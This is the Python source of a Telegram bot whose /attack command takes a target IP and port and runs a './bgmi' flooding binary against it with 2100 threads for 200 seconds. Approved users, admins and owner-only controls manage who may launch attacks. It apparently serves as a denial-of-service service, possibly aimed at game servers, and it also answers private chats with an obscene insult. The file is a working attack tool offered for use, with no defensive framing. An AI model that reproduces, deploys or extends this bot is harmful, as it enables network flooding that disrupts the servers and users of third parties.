import subprocess
import json
import os
import asyncio
import time
import logging
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters

# Config
from config import BOT_TOKEN, OWNER_USERNAME, CHANNEL_LINK, CHANNEL_LOGO

USER_FILE = "users.json"
ADMIN_FILE = "admins.json"
DEFAULT_THREADS = 2100
DEFAULT_PACKET = 20
DEFAULT_DURATION = 200
ATTACK_COOLDOWN = 300

# Initialize data structures
users = {}
admins = {}
user_processes = {}
user_last_attack = {}

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def load_data(file):
    try:
        with open(file, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_data(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=4)

async def check_group(update: Update) -> bool:
    if update.message.chat.type == "private":
        await update.message.reply_text("❌ GROUP ME JAKE MAA CHUDA APNI. YAHA GAND NA MARA.")
        return False
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    chat_id = update.message.chat.id
    message = (
        "🚀 **Welcome to the Attack Bot!** 🚀\n\n"
        "🔹 Use /attack <target_ip> <port> to launch an attack.\n"
        "🔹 Join our channel for updates:\n"
        f"[🔗 Click Here]({CHANNEL_LINK})\n\n"
        "💻 **Developed by**: @" + OWNER_USERNAME
    )

    if os.path.exists(CHANNEL_LOGO):
        with open(CHANNEL_LOGO, "rb") as logo:
            await context.bot.send_photo(chat_id=chat_id, photo=InputFile(logo), caption=message, parse_mode="Markdown")
    else:
        await update.message.reply_text(message, parse_mode="Markdown")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in users:
        await update.message.reply_text("❌ You are not approved to use this command.")
        return

    if len(context.args) != 2:
        await update.message.reply_text("Usage: /attack <target_ip> <port>")
        return

    target_ip, port = context.args

    last_attack_time = user_last_attack.get(user_id, 0)
    current_time = time.time()

    if current_time - last_attack_time < ATTACK_COOLDOWN:
        remaining_time = int(ATTACK_COOLDOWN - (current_time - last_attack_time))
        await update.message.reply_text(f"⚠️ Please wait {remaining_time} seconds before launching another attack.")
        return

    command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    
    try:
        process = subprocess.Popen(command)
    except Exception as e:
        logger.error(f"Error while starting attack: {e}")
        await update.message.reply_text("❌ There was an error starting the attack.")
        return

    user_processes[user_id] = process
    user_last_attack[user_id] = current_time

    await update.message.reply_text(f'🚀 Attack started: {target_ip}:{port} for {DEFAULT_DURATION} seconds.')

    await asyncio.sleep(DEFAULT_DURATION)

    process.terminate()
    del user_processes[user_id]

    await update.message.reply_text(f'✅ Attack finished: {target_ip}:{port}.')

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    if str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only the owner can add admins.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /add_admin <user_id> <username>")
        return

    target_user_id, target_username = context.args

    admins[target_user_id] = target_username
    save_data(ADMIN_FILE, admins)

    await update.message.reply_text(f"✅ User {target_username} (ID: {target_user_id}) is now an admin.")

async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    if str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only the owner can remove admins.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove_admin <user_id>")
        return

    target_user_id = context.args[0]
    if target_user_id in admins:
        del admins[target_user_id]
        save_data(ADMIN_FILE, admins)
        await update.message.reply_text(f"✅ User ID {target_user_id} has been removed from admins.")
    else:
        await update.message.reply_text(f"⚠️ User ID {target_user_id} is not an admin.")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only admins or the owner can add users.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /add <user_id> <username>")
        return

    target_user_id, target_username = context.args

    users[target_user_id] = target_username
    save_data(USER_FILE, users)

    await update.message.reply_text(f"✅ User {target_username} (ID: {target_user_id}) has been approved.")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only admins or the owner can remove users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove <user_id>")
        return

    target_user_id = context.args[0]
    if target_user_id in users:
        del users[target_user_id]
        save_data(USER_FILE, users)
        await update.message.reply_text(f"✅ User {target_user_id} has been removed.")
    else:
        await update.message.reply_text(f"⚠️ User ID {target_user_id} is not in the approved list.")

async def all_members(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await check_group(update):
        return

    user_id = str(update.message.from_user.id)
    if user_id not in admins and str(update.message.from_user.username) != OWNER_USERNAME:
        await update.message.reply_text("❌ Only the owner or admins can use this command.")
        return

    approved_users_list = "\n".join([f"{uid} → {uname}" for uid, uname in users.items()]) if users else "No approved users."
    admins_list = "\n".join([f"{uid} → {uname}" for uid, uname in admins.items()]) if admins else "No admins."

    message = f"👥 **Approved Users:**\n{approved_users_list}\n\n👑 **Admins:**\n{admins_list}"
    await update.message.reply_text(message)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
        "📌 **Available Commands:**\n"
        "/start - Show bot info\n"
        "/attack <ip> <port> - Start an attack\n"
        "/add <user_id> <username> - Add user\n"
        "/remove <user_id> - Remove user\n"
        "/add_admin <user_id> <username> - Add admin\n"
        "/remove_admin <user_id> - Remove admin\n"
        "/allmembers - List all users and admins\n"
    )
    await update.message.reply_text(message)

def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Log Errors caused by Updates."""
    logger.warning(f"Update {update} caused error {context.error}")

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("add_admin", add_admin))
    application.add_handler(CommandHandler("remove_admin", remove_admin))
    application.add_handler(CommandHandler("allmembers", all_members))
    application.add_handler(CommandHandler("help", help_command))

    application.add_error_handler(error)

    global users, admins
    users = load_data(USER_FILE)
    admins = load_data(ADMIN_FILE)

    application.run_polling()

if __name__ == '__main__':
    main()
